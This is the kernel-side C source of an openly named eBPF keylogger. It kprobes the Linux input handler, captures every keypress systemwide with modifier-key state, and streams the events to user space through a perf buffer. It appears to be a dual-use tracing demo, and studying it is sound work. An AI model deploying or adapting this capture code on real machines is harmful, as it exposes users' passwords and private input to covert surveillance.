/*
    bpf_keylogger: Log key presses and mouse button events systemwide using eBPF
    Copyright (C) 2019  William Findlay
    Modifcations Copyright (C) 2023  Dave Tucker

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/
#include "vmlinux.h"

#include <bpf/bpf_core_read.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>

#define BKL_CTRL 0
#define BKL_SHIFT 1
#define BKL_ALT 2
#define BKL_META 3
#define EV_KEY 0x01
#define KEY_LEFTSHIFT 42
#define KEY_RIGHTSHIFT 54
#define KEY_LEFTCTRL 29
#define KEY_RIGHTCTRL 97
#define KEY_LEFTALT 56
#define KEY_RIGHTALT 100
#define KEY_LEFTMETA 125
#define KEY_RIGHTMETA 126

struct bkl_key_event {
  unsigned int code;
  __u8 ctrl;
  __u8 shift;
  __u8 alt;
  __u8 meta;
} bkl_key_event;

struct {
  __uint(type, BPF_MAP_TYPE_ARRAY);
  __type(key, __u32);
  __type(value, __u8);
  __uint(max_entries, 4);
} modifiers SEC(".maps");

struct {
  __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);
} keypresses SEC(".maps");

char LICENSE[] SEC("license") = "GPL";

/* https://github.com/torvalds/linux/blob/master/drivers/input/input.c */
SEC("kprobe/input_handle_event")
int BPF_KPROBE(input_handle_event, struct input_dev *dev, unsigned int type,
               unsigned int code, int value) {

  /* Modifiers */
  __u8 *ctrl;
  __u8 *shift;
  __u8 *alt;
  __u8 *meta;
  __u32 k;

  /* Keypress event */
  struct bkl_key_event kev = {};

  /* Filter keydown events */
  if (type == EV_KEY && value) {
    /* Lookup modifiers */
    k = BKL_CTRL;
    ctrl = bpf_map_lookup_elem(&modifiers, &k);
    k = BKL_SHIFT;
    shift = bpf_map_lookup_elem(&modifiers, &k);
    k = BKL_ALT;
    alt = bpf_map_lookup_elem(&modifiers, &k);
    k = BKL_META;
    meta = bpf_map_lookup_elem(&modifiers, &k);

    /* handle lookup errors */
    if (!ctrl) {
      return 0;
    }
    if (!shift) {
      return 0;
    }
    if (!alt) {
      return 0;
    }
    if (!meta) {
      return 0;
    }

    /* Assign key code to event */
    kev.code = code;

    /* Assign modifiers to event */
    kev.ctrl = *ctrl;
    kev.shift = *shift;
    kev.alt = *alt;
    kev.meta = *meta;

    /* Submit event */
    bpf_perf_event_output(ctx, &keypresses, BPF_F_CURRENT_CPU, &kev,
                          sizeof(kev));

    /* Maybe set modifiers */
    if (code == KEY_LEFTSHIFT || code == KEY_RIGHTSHIFT) {
      int k = BKL_SHIFT;
      __u8 v = 1;
      bpf_map_update_elem(&modifiers, &k, &v, 0);
    }
    if (code == KEY_LEFTCTRL || code == KEY_RIGHTCTRL) {
      int k = BKL_CTRL;
      __u8 v = 1;
      bpf_map_update_elem(&modifiers, &k, &v, 0);
    }
    if (code == KEY_LEFTALT || code == KEY_RIGHTALT) {
      int k = BKL_ALT;
      __u8 v = 1;
      bpf_map_update_elem(&modifiers, &k, &v, 0);
    }
    if (code == KEY_LEFTMETA || code == KEY_RIGHTMETA) {
      int k = BKL_META;
      __u8 v = 1;
      bpf_map_update_elem(&modifiers, &k, &v, 0);
    }
  }
  /* Filter keyup events */
  else if (type == EV_KEY && !value) {
    /* Maybe reset modifiers */
    if (code == KEY_LEFTSHIFT || code == KEY_RIGHTSHIFT) {
      int k = BKL_SHIFT;
      __u8 v = 0;
      bpf_map_update_elem(&modifiers, &k, &v, 0);
    }
    if (code == KEY_LEFTCTRL || code == KEY_RIGHTCTRL) {
      int k = BKL_CTRL;
      __u8 v = 0;
      bpf_map_update_elem(&modifiers, &k, &v, 0);
    }
    if (code == KEY_LEFTALT || code == KEY_RIGHTALT) {
      int k = BKL_ALT;
      __u8 v = 0;
      bpf_map_update_elem(&modifiers, &k, &v, 0);
    }
    if (code == KEY_LEFTMETA || code == KEY_RIGHTMETA) {
      int k = BKL_META;
      __u8 v = 0;
      bpf_map_update_elem(&modifiers, &k, &v, 0);
    }
  }

  return 0;
}
